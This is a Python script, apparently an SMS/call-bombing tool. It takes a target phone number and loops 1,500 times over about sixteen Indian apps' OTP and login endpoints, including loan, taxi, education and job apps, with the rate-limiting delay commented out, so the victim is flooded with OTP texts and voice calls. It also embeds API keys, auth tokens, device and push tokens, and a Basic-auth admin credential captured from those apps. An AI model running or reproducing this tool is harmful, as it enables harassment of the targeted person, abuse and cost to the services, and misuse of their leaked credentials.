import requests
import json
import time

def smsgii(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        
        
        {
            "method": "POST",
            "url": "https://learn.seekog.com/webservice/rest/server.php?moodlewsrestformat=json&wsfunction=auth_otp_request_otp",
            "headers": {
                "Host": "learn.seekog.com",
                "content-length": "97",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36 MoodleMobile 4.1.1 (41100)",
                "sec-ch-ua-platform": '"Android"',
                "origin": "http://localhost",
                "x-requested-with": "com.moodle.seekog",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "http://localhost/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i"
            },
            "data": {
                "username": "+91"+number,
                "wsfunction": "auth_otp_request_otp",
                "wstoken": "b9749ed9fefb5ec57dad6c05d93ab6da"
            }
        },
        
        {
            "method": "POST",
            "url": "https://api.bharatloanfintech.com/saveCustomerProfileAAPPS",
            "headers": {
                "Accept": "application/json",
                "Authtoken": "",
                "Auth": "ZGRmMzg0ZDlhNjQyZGE4MzI0YTdmNDNkODcyZDA3MzU=",
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "389",
                "Host": "api.bharatloanfintech.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "adjust_adid": 1,
                "adjust_gps_id": 1,
                "adjust_idfa": 1,
                "current_page": "login",
                "fcm_token": "ei4BdR0tRh6csHkndeAaPh:APA91bGBhUyP_tKrbUuvOQ4MhD7_c-zUFZnONSfv2EZzfO5Xp_tpw5U1Ryx3aX6REV52ANJY6m2RcIFcxWQjDfwKlXBsBLUHbHTZzpdy-fjmup9Xilo1jPAKHgswVV0xqXSPZZfU1Zef",
                "geo_lat": "",
                "geo_long": "",
                "is_existing_customer": 0,
                "mobile": number,
                "pancard": "",
                "utm_campaign": "",
                "utm_medium": "",
                "utm_source": ""
            }
        },
        {
            "method": "POST",
            "url": "https://sales.shreejamilk.com/admin/shreeja_api/step1",
            "headers": {
                "Authorization": "Basic YWRtaW46MTIzNDU2",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Host": "sales.shreejamilk.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.2.2"
            },
            "data": {
                "mobile": number
            }
        },
        
        {
            "method": "POST",
            "url": "https://db.ezobooks.in/kappa/api/login/sendOtp",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "16",
                "Host": "db.ezobooks.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "phone": number
            }
        },
        {
            "method": "POST",
            "url": "https://merucabapp.com/api/otp/generate",
            "headers": {
                "Mobilenumber": number,
                "Mid": "22c1197675ae55ad475cecc77df0db8792c8b370795ffed606b83e2549dadf12",
                "Oauthtoken": "",
                "AppVersion": "233",
                "ApiVersion": "6.2.42",
                "DeviceType": "Android",
                "DeviceId": "c7abc1fd7459e84c",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "24",
                "Host": "merucabapp.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.0"
            },
            "data": f"mobile_number={number}"
        },
        
        {
            "method": "POST",
            "url": "https://rideally.com/services/auth/getotp",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "rideally.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "39"
            },
            "data": f"device_type=1&mobile_number={number}&"
        },
        {
            "method": "POST",
            "url": "https://app.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000",
            "headers": {
                "Host": "app.chaayos.com",
                "accept": "application/json",
                "devicekey": "033aJUvGhyAVBtPM4BdE0N7SvhJ6YhaoXloyYXu7C6uhCa0e0+6qWLNlHSzGuVHa",
                "content-type": "application/json",
                "content-length": "10",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": number
        },
        
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "119",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_SMS", "source": "USER"})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "125",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_VOICECALL", "source": "USER"})
        },
        
        {
            "method": "POST",
            "url": "https://www.klikk.co.in/api/?r=User%2FLoginWithOTP",
            "headers": {
                "Host": "www.klikk.co.in",
                "api-key": "f4f068e71e0d87bf0ad51e6214ab84e9",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.0"
            },
            "data": {
                "appVersion": "67",
                "contactNumber": f"+91-{number}",
                "deviceId": "c7abc1fd7459e84c",
                "deviceName": "samsung SM-F7110",
                "deviceToken": "ccLYOFb0ToSRojHA80gt08:APA91bHbZ1OB7YVwMA3ucZebydnY5O4gzHEPV9XnK13KLYyVEb9rmxZfBA8Xxntiue0Yeyu89hfo2xYw_N-gsBAEKP9hSLjNsKhVQLw2Y2QxlCETbCWPT1NKyTTvrkvHt3UI6R1MXrzO",
                "deviceType": "android",
                "socialType": "0"
            }
        },
        {
            "method": "POST",
            "url": "https://api.jobhai.com/auth/recruiter/v2/send_otp",
            "headers": {
                "Host": "api.jobhai.com",
                "x-transaction-id": "RecApp-a231f1dc-bcfe-43c5-8308-c82a82f137aa",
                "device-id": "1fb0feaf-bfa2-4a78-a198-dc6020aeec85",
                "versioncode": "230010809",
                "user-agent": "RecApp/230010809",
                "source": "APP",
                "session-id": "15d38691-b7a7-47cf-afb1-f787eedc4a43",
                "referer": "https://www.jobhai.com/hire",
                "cookie": "source=RecApp/230010809",
                "accept": "*/*",
                "accept-language": "*",
                "accept-encoding": "*",
                "content-type": "application/json; charset=utf-8"
            },
            "data": {
                "phone": number
            }
        },
        {
            "method": "POST",
            "url": "https://ai.gigin.ai/live_app_api/index.php/api_controller/register",
            "headers": {
                "Host": "ai.gigin.ai",
                "Connection": "keep-alive",
                "Content-Length": "158",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Origin": "https://localhost",
                "X-Requested-With": "com.giginap.jobs",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://localhost/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9"
            },
            "data": {
                "Mobile": number,
                "type": "Android",
                "SID": None,
                "rel_id": None,
                "version": "4.6.0",
                "deviceModel": "SM-F7110",
                "deviceVersion": "14",
                "deviceManufactur": "samsung"
            }
        },
        {
            "method": "GET",
            "url": "https://api.pocketnovel.com/v2/user_api/user.send_otp",
            "headers": {
                "Host": "api.pocketnovel.com",
                "ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "version-name": "1.7.6",
                "region-code": "UP",
                "client-ts": "1714841716413",
                "which-app": "com.pocketfm.novel",
                "is-headset": "false",
                "device-create-time": "1714841706",
                "locale": "IN",
                "device-id": "c7abc1fd7459e84c",
                "platform": "android",
                "user-tg": "google-play",
                "content-ln": "hi",
                "app-name": "pocket_novel",
                "auth-token": "03971f2055de19233bcb54434a22d21fadaeb6bb",
                "content-type": "application/json;charset=utf-8",
                "screen-density": "1080px",
                "app-client": "consumer-android",
                "accept": "application/json",
                "app-version": "647",
                "ip-address": "192.0.0.8",
                "is-fg": "true",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "params": {
                "phone_number": f"+91{number}",
                "country_code": "+91",
                "channel": ""
            }
        },
        {
            "method": "POST",
            "url": "https://api.doubtnut.com/v4/student/login",
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1158",
                "has_upi": "true",
                "device_model": "SM-F7110",
                "android_sdk_version": "34",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "app_version": "7.10.49",
                "aaid": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "c7abc1fd7459e84c",
                "class": "",
                "gcm_reg_id": "e22lGNSVQrOSgtZCRHZqo3:APA91bHgPX8e1u6pHq09qQQ-LEaf6m3o0vMPLftv-GQjbM29MJ8m3-EhyyoWPwPsy2RMGYxVq28r6J0UC-UslEBJ4r03v4ClPqJiKoskoHKwFAlNq6ULcL1THrlhQeUeOSgTPcpLOEj1"
            }
        },
        {
            "method": "PUT",
            "url": "https://micro.doubtnut.com/otp/send-call",
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1158",
                "has_upi": "true",
                "device_model": "SM-F7110",
                "android_sdk_version": "34",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "phone": number,
                "locale": "en"
            }
        },
        
        {
            "method": "POST",
            "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
            "headers": {
                "Host": "prod-auth-api.upgrad.com",
                "requestid": "5bf2ce83-8a3a-4181-af6e-4a99acae123a",
                "distinctid": "c7abc1fd7459e84c",
                "operatingsystem": "Android 14",
                "browserinfo": "App 356",
                "devicetype": "samsung SM-F7110",
                "courseid": "0",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.0"
            },
            "data": {
                "phoneNumber": f"+91{number}"
            }
        }
        
        
    ]
        
    
    # Run the requests for 500 times
    for _ in range(1500):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            # Uncomment the line below to print the status code of each request
          #  print(f"Request to {api['url']} - Status Code: {response.status_code}")
        
        # Add a delay of 1 second between requests
      #  time.sleep(1)

# Example usage:
##smsgii("932")  # Replace "9336734442" with the phone number you want to use
